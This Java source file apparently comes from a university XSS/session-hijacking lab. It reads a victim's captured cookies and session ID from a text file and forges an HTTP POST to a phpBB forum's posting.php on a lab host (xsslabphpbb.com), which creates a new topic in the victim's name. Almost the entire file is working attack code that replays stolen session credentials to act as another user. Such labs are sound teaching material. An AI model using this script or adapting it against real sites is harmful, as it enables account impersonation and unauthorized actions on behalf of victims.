import java.io.*;
import java.net.*;

public class HTTPSimpleForge {

   public static void main(String[] args) throws IOException {
   try {
	File file = new File("task2input.txt");
	InputStreamReader read = new InputStreamReader(new FileInputStream(file));
	BufferedReader bufferedReader = new BufferedReader(read);
	String lineTxt = null;
	int count = 0;
	String sid = "", cookies = "";
	while((lineTxt = bufferedReader.readLine()) != null){
		if (count == 0) {
			cookies = lineTxt;
		} else if (count == 1){
			sid = lineTxt;
		}	
		count++;
	}
System.out.println(sid);
	int responseCode;
	InputStream responseIn=null;
	
	// URL to be forged.
	URL url = new URL ("http://www.xsslabphpbb.com/posting.php");
	
	// URLConnection instance is created to further parameterize a 
	// resource request past what the state members of URL instance 
	// can represent.
	URLConnection urlConn = url.openConnection();
	if (urlConn instanceof HttpURLConnection) {
		urlConn.setConnectTimeout(60000);
		urlConn.setReadTimeout(90000);
	}
		
	// addRequestProperty method is used to add HTTP Header Information.
	// Here we add User-Agent HTTP header to the forged HTTP packet.
	urlConn.addRequestProperty("User-agent","Sun JDK 1.6");	
	urlConn.addRequestProperty("Cookie",cookies);
	
	//HTTP Post Data which includes the information to be sent to the server.
	String data="subject=XSS&addbbcode18=%23444444&addbbcode20=0&helpbox=Font+color%3A+%5Bcolor%3Dred%5Dtext%5B%2Fcolor%5D++Tip%3A+you+can+also+use+color%3D%23FF0000&message=A+forged+message%21&poll_title=&add_poll_option_text=&poll_length=&mode=newtopic&sid=" + sid + "&f=1&post=Submit";
		
	// DoOutput flag of URL Connection should be set to true 
	// to send HTTP POST message.
	urlConn.setDoOutput(true);
		
	// OutputStreamWriter is used to write the HTTP POST data 
	// to the url connection.        	
        OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());
        wr.write(data);
        wr.flush();

	// HttpURLConnection a subclass of URLConnection is returned by 
	// url.openConnection() since the url  is an http request.			
	if (urlConn instanceof HttpURLConnection) {
		HttpURLConnection httpConn = (HttpURLConnection) urlConn;
		
		// Contacts the web server and gets the status code from 
		// HTTP Response message.
		responseCode = httpConn.getResponseCode();
		System.out.println("Response Code = " + responseCode);
	
		// HTTP status code HTTP_OK means the response was 
		// received successfully.
		if (responseCode == HttpURLConnection.HTTP_OK) {

			// Get the input stream from url connection object.
			responseIn = urlConn.getInputStream();
			
			// Create an instance for BufferedReader 
			// to read the response line by line.
			BufferedReader buf_inp = new BufferedReader(
					new InputStreamReader(responseIn));
			String inputLine;
			while((inputLine = buf_inp.readLine())!=null) {
				System.out.println(inputLine);
			}
		}
	}
     } catch (MalformedURLException e) {
		e.printStackTrace();
     }
   }
}
